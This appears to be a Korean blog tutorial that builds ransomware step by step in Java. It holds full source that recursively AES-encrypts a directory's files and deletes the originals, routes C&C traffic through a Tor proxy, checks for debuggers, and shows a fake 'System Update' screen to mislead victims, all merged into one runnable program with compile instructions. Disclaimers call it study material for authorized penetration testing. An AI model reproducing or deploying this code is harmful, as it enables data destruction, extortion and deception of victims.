---
layout: single
title:  "랜섬웨어 구현해보기"
categories: "Secure"
tag: "Secure"
toc: true
author_profile: false
sidebar:
    nav: "docs"
---

# Ransomware
다들 이상한 사이트나 블로그 같은곳에서 이상한 파일을 다운받다가 랜섬웨어에 걸리는 경험을 한 적이 있을것이다.  
본인의 컴퓨터 안의 파일들의 확장자가 바뀌어 접근할 수 없어지고, 몇몇의 파일은 실행조차 되지 않느 ㄴ그런 경험 말이다.  
이번엔 랜섬웨어의 코드를 살펴보며, 그 원리를 이해해 보는 시간을 가져보자.  

후술되는 코드는 윤리적, 법적문제를 초례할 수 있다.  
절대 실행되선 안되므로, 꼭 공부용도로만 사용하자.  

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;

public class RansomwareSimulation {

    // SHA-256 해시 함수
    public static String hashWithSHA256(String input) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(input.getBytes("UTF-8"));
        StringBuilder hexString = new StringBuilder();
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }

    // AES 키 생성
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128, new SecureRandom()); // 128-bit AES 키
        return keyGen.generateKey();
    }

    // 파일 암호화
    public static void encryptFile(File inputFile, File outputFile, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        try (FileInputStream fis = new FileInputStream(inputFile);
             FileOutputStream fos = new FileOutputStream(outputFile)) {

            byte[] buffer = new byte[1024];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                byte[] output = cipher.update(buffer, 0, bytesRead);
                if (output != null) fos.write(output);
            }

            byte[] outputBytes = cipher.doFinal();
            if (outputBytes != null) fos.write(outputBytes);
        }
    }

    // 파일 복호화
    public static void decryptFile(File inputFile, File outputFile, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        try (FileInputStream fis = new FileInputStream(inputFile);
             FileOutputStream fos = new FileOutputStream(outputFile)) {

            byte[] buffer = new byte[1024];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                byte[] output = cipher.update(buffer, 0, bytesRead);
                if (output != null) fos.write(output);
            }

            byte[] outputBytes = cipher.doFinal();
            if (outputBytes != null) fos.write(outputBytes);
        }
    }

    // 디렉토리의 모든 파일 검색
    public static List<File> findFiles(String directory) throws IOException {
        return Files.walk(Paths.get(directory))
                .filter(Files::isRegularFile)
                .map(Path::toFile)
                .collect(Collectors.toList());
    }

    // 제어 서버와의 통신 시뮬레이션
    public static void communicateWithServer(String id, String encryptedKey) {
        // 실제 서버 통신 대신 출력으로 대체
        System.out.println("Communicating with server...");
        System.out.println("ID: " + id);
        System.out.println("Encrypted Key: " + encryptedKey);
    }

    public static void main(String[] args) {
        try {
            // 1. 실행 환경 체크
            System.out.println("Operating System: " + System.getProperty("os.name"));
            System.out.println("Java Version: " + System.getProperty("java.version"));

            // 2. 키 생성 및 ID 설정
            SecretKey secretKey = generateKey();
            String id = hashWithSHA256("unique_id_" + System.currentTimeMillis()); // ID는 SHA-256으로 생성
            System.out.println("Generated ID: " + id);

            // 3. 암호화 수행
            String directoryPath = "./test_directory"; // 테스트할 디렉토리 경로
            List<File> files = findFiles(directoryPath);

            for (File file : files) {
                File encryptedFile = new File(file.getAbsolutePath() + ".encrypted");
                encryptFile(file, encryptedFile, secretKey);
                file.delete(); // 원본 파일 삭제
                System.out.println("Encrypted file: " + encryptedFile.getAbsolutePath());
            }

            // 4. 제어 서버와 통신 (시뮬레이션)
            String encodedKey = Base64.getEncoder().encodeToString(secretKey.getEncoded());
            communicateWithServer(id, encodedKey);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 주요 함수

1. SHA-256 해시 적용:  
   - `hashWithSHA256` 메서드를 통해 고유한 ID를 생성하며, 이를 제어 서버와 통신 시 사용한다.  

2. 파일 암호화:  
   - `encryptFile` 메서드로 모든 파일을 암호화하며, 결과 파일에 `.encrypted` 확장자를 추가한다.  
   - 원본 파일은 삭제한다.  

3. C&C 서버와 통신:  
   - `communicateWithServer` 메서드에서 실제 서버 통신 대신 단순히 데이터를 출력한다.  
   - 실제 랜섬웨어는 Tor 네트워크를 통해 서버와 통신해 익명성을 유지합니다.  

4. 실행 환경 체크:  
   - 현재 시스템의 운영 체제와 자바 버전을 출력한다.가상머신, 디버거, 루팅여부등을 탐지하는 로직을 추가할 수 있다.  

5.*UI/UX 기만:  
   - 사용자에게 추가 메시지를 출력하거나, GUI를 통해 기만적인 메시지를 표시할 수 있다.  이 예제에서는 간단히 텍스트로 구현하였지만, 실제로 마우스나 키보드 입력을 막는 등의 방식으로 사용자를 무력화 시켜 기만할 수 있다.  

---

### 알아가면 좋은 것

- 암호화 및 해시: AES와 SHA-256 사용법 익히기.  
- 파일 처리: 디렉토리 내 파일 탐색 및 처리.  
- 보안 프로토콜 이해: C&C 서버와의 통신 방식.  

# 빈 로직들 세부 구현  
이어서, 앞서 말한 기능들을 어떻게 구현하면 되는지에 대해 알아보자.  
랜섬웨어에서 Tor 네트워크 통신, 실행 환경 체크, UI/UX 기만 기능을 Java로 구현하는 방법을 단계별로 설명하겠다.  

### 1. Tor 네트워크 통신
Tor 네트워크를 사용하면 C&C 서버와의 통신을 익명으로 라우팅할 수 있다.  
이를 구현하려면 Tor Proxy와 HTTP 클라이언트를 연동해야 한다.  

#### 구현
Java에서는 Tor 네트워크와 통신하기 위해 Tor Proxy 소프트웨어(예: Tor Expert Bundle)를 설치하고 `SocksProxy` 설정을 활용한다.  
Tor를 통해 HTTP 요청을 보내기 위해 Apache HttpClient를 사용할 수 있다.  

```java
import org.apache.http.HttpHost;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class TorCommunication {
    public static void communicateWithTorServer(String url) {
        try {
            // Tor Proxy 설정
            HttpHost proxy = new HttpHost("127.0.0.1", 9050); // Tor 기본 포트 9050

            CloseableHttpClient httpClient = HttpClients.custom()
                    .setProxy(proxy)
                    .build();

            HttpGet request = new HttpGet(url);
            CloseableHttpResponse response = httpClient.execute(request);

            System.out.println("Tor Response: " + response.getStatusLine());
        } catch (Exception e) {
            System.err.println("Tor Communication Failed: " + e.getMessage());
        }
    }

    public static void main(String[] args) {
        communicateWithTorServer("http://example.onion"); // 테스트 서버 URL
    }
}
```

### 2. 실행 환경 체크
실행 환경 체크는 OS, 메모리, 디버깅 도구의 존재 등을 확인하는 것으로 시작한다.  

#### 구현
Java의 시스템 프로퍼티와 네이티브 명령어 실행으로 환경을 검사한다.  

```java
public class EnvironmentCheck {
    public static void checkEnvironment() {
        try {
            System.out.println("OS: " + System.getProperty("os.name"));
            System.out.println("Java Version: " + System.getProperty("java.version"));
            System.out.println("Available Processors: " + Runtime.getRuntime().availableProcessors());
            System.out.println("Free Memory: " + Runtime.getRuntime().freeMemory());

            // 디버거 감지 (간단한 예)
            String[] commands = {"/bin/sh", "-c", "ps aux | grep java"};
            Process process = Runtime.getRuntime().exec(commands);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("debug")) {
                        System.out.println("Debugger detected!");
                    }
                }
            }

        } catch (Exception e) {
            System.err.println("Environment check failed: " + e.getMessage());
        }
    }

    public static void main(String[] args) {
        checkEnvironment();
    }
}
```

### 3. UI/UX 기만
사용자 인터페이스(UI)를 통해 피해자를 기만하는 기능은 Swing 또는 JavaFX로 간단히 구현할 수 있다.  
예를 들어, "업데이트 진행 중"이라는 메시지를 표시하면서 백그라운드에서 암호화 작업을 진행한다.  

#### 구현  

```java
import javax.swing.*;

public class FakeUI {
    public static void showFakeUpdateScreen() {
        JFrame frame = new JFrame("System Update");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(300, 100);

        JLabel label = new JLabel("System Update in Progress...", SwingConstants.CENTER);
        frame.add(label);

        frame.setVisible(true);

        // 백그라운드 암호화 작업 시뮬레이션
        new Thread(() -> {
            try {
                Thread.sleep(10000); // 10초 대기 (암호화 작업 시간)
                frame.dispose(); // 작업 완료 후 UI 종료
                System.out.println("Fake update completed.");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void main(String[] args) {
        showFakeUpdateScreen();
    }
}
```

### 통합 코드 예제  
위 모든 기능을 하나의 메인 코드로 통합한다.  

```java
public class RansomwareSimulationWithTor {
    public static void main(String[] args) {
        try {
            System.out.println("Starting ransomware simulation...");

            // 1. 실행 환경 체크
            EnvironmentCheck.checkEnvironment();

            // 2. Tor 네트워크 통신 시뮬레이션
            TorCommunication.communicateWithTorServer("http://example.onion");

            // 3. UI/UX 기만 (업데이트 화면 표시)
            FakeUI.showFakeUpdateScreen();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```  

### 알아가면 좋은것들  
1. Tor 통신:  
   - Tor Proxy를 설정하여 익명 네트워크 요청을 보내는 방식 이해.  
2. 실행 환경 체크:  
   - 시스템 프로퍼티와 프로세스를 통해 디버거와 시스템 상태를 확인.  
3. UI/UX 기만:  
   - 사용자 인터페이스 설계를 통해 사용자를 오도하는 방법.  

이제, 앞선 코드들을 하나의 코드로 합쳐보자.  

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.io.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;
import org.apache.http.HttpHost;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class RansomwareSimulationWithTor {

    // SHA-256 해시 함수
    public static String hashWithSHA256(String input) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(input.getBytes("UTF-8"));
        StringBuilder hexString = new StringBuilder();
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }

    // AES 키 생성
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128, new SecureRandom());
        return keyGen.generateKey();
    }

    // 파일 암호화
    public static void encryptFile(File inputFile, File outputFile, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        try (FileInputStream fis = new FileInputStream(inputFile);
             FileOutputStream fos = new FileOutputStream(outputFile)) {

            byte[] buffer = new byte[1024];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                byte[] output = cipher.update(buffer, 0, bytesRead);
                if (output != null) fos.write(output);
            }

            byte[] outputBytes = cipher.doFinal();
            if (outputBytes != null) fos.write(outputBytes);
        }
    }

    // 디렉토리의 모든 파일 검색
    public static List<File> findFiles(String directory) throws IOException {
        return Files.walk(Paths.get(directory))
                .filter(Files::isRegularFile)
                .map(Path::toFile)
                .collect(Collectors.toList());
    }

    // Tor 네트워크 통신
    public static void communicateWithTorServer(String url) {
        try {
            HttpHost proxy = new HttpHost("127.0.0.1", 9050);
            CloseableHttpClient httpClient = HttpClients.custom()
                    .setProxy(proxy)
                    .build();

            HttpGet request = new HttpGet(url);
            CloseableHttpResponse response = httpClient.execute(request);

            System.out.println("Tor Response: " + response.getStatusLine());
        } catch (Exception e) {
            System.err.println("Tor Communication Failed: " + e.getMessage());
        }
    }

    // 환경 체크
    public static void checkEnvironment() {
        try {
            System.out.println("OS: " + System.getProperty("os.name"));
            System.out.println("Java Version: " + System.getProperty("java.version"));
            System.out.println("Available Processors: " + Runtime.getRuntime().availableProcessors());
            System.out.println("Free Memory: " + Runtime.getRuntime().freeMemory());

            String[] commands = {"/bin/sh", "-c", "ps aux | grep java"};
            Process process = Runtime.getRuntime().exec(commands);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("debug")) {
                        System.out.println("Debugger detected!");
                    }
                }
            }

        } catch (Exception e) {
            System.err.println("Environment check failed: " + e.getMessage());
        }
    }

    // 가짜 업데이트 화면 표시
    public static void showFakeUpdateScreen() {
        JFrame frame = new JFrame("System Update");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(300, 100);

        JLabel label = new JLabel("System Update in Progress...", SwingConstants.CENTER);
        frame.add(label);

        frame.setVisible(true);

        new Thread(() -> {
            try {
                Thread.sleep(10000);
                frame.dispose();
                System.out.println("Fake update completed.");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void main(String[] args) {
        try {
            System.out.println("Starting ransomware simulation...");

            // 환경 체크
            checkEnvironment();

            // Tor 네트워크 통신
            communicateWithTorServer("http://example.onion");

            // 가짜 업데이트 화면 표시
            showFakeUpdateScreen();

            // 암호화 테스트
            String directoryPath = "./test_directory";
            SecretKey secretKey = generateKey();
            List<File> files = findFiles(directoryPath);

            for (File file : files) {
                File encryptedFile = new File(file.getAbsolutePath() + ".encrypted");
                encryptFile(file, encryptedFile, secretKey);
                file.delete();
                System.out.println("Encrypted file: " + encryptedFile.getAbsolutePath());
            }

            String encodedKey = Base64.getEncoder().encodeToString(secretKey.getEncoded());
            String id = hashWithSHA256("unique_id_" + System.currentTimeMillis());
            System.out.println("Generated ID: " + id);
            System.out.println("Encoded Key: " + encodedKey);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

# 주요기능  

1. 환경 체크: 시스템 정보를 출력하고 디버거 존재 여부를 감지.  
2. Tor 통신: Tor 프록시를 통해 서버와 통신.  
3. 가짜 UI 표시: 업데이트 화면을 사용자에게 보여주는 시뮬레이션.  
4. 파일 암호화: 지정된 디렉토리 내 파일을 AES로 암호화.  
5. SHA-256 ID 생성: 고유한 ID를 생성해 데이터 보호 시뮬레이션.  

모의 해킹시에나 위 코드 사용할수 있다. 절대로 악의적인 의도로 위 코드를 실행시켜선 안된다.  
그건 불법으로, 민사등의 처벌을 받을 수 있음을 명심하자.  

### 모의해킹 목적으로 안전하게 위 코드 실행하기
1. 격리된 테스트 환경 사용  
코드 실행은 물리적 인터넷과 분리된 가상 환경(예: VirtualBox, VMware)에서만 수행해야 한다.  
가상머신은 테스트 후 초기화하여 외부로 데이터가 유출되지 않도록 해야 한다.  
테스트 환경에 사용된 파일은 반드시 임시 파일이어야 하며, 중요한 파일은 절대 사용하지 말아야 한다.  

2. 테스트 범위 제한  
자신의 관리 권한이 없는 환경에서 실행하거나 배포하지 않아야 한다.  
테스트 대상은 동의한 시스템과 환경이어야 하며, 다른 사람의 데이터를 포함해서는 안된다.  

3. 교육 및 연구 목적으로 만 사용  
수업이나 윤리적 해킹 목적으로 사용하려는 경우, 반드시 법적 절차를 따르고 관련 기관(예: 학교, 회사)에서 허가를 받아야 한다.  
해당 목적에 대해 명확히 설명하고, 실행 결과가 외부로 유출되지 않도록 해야 한다.  

4. 코드 실행  
    1. Java 컴파일 환경 준비  
    Java Development Kit(JDK)를 설치한다.  
    코드를 단일 파일로 합치고, .java 확장자로 저장합니다(예: RansomwareSimulation.java).  

    2. 컴파일 및 실행  
    먼저, 컴파일 하고  
    ```bash
    javac RansomwareSimulation.java

    ```  

    실행  
    ```bash
    java RansomwareSimulation

    ```  

    코드 실행 전에 테스트 환경에서 사용할 임시 디렉토리 및 파일을 준해야 한다.  
    암호화된 파일은 복호화 키가 없으면 복원할 수 없으므로, 복호화 테스트도 포함해야 한다.  

이 글은 악성코드가 작동하는 원리와 이를 방어하는 방법을 이해하는 것을 목적으로 한다.  
절대 악의적인 의도가 아니며, 코딩실력의 향상과 공부만을 목적으로 한다.  
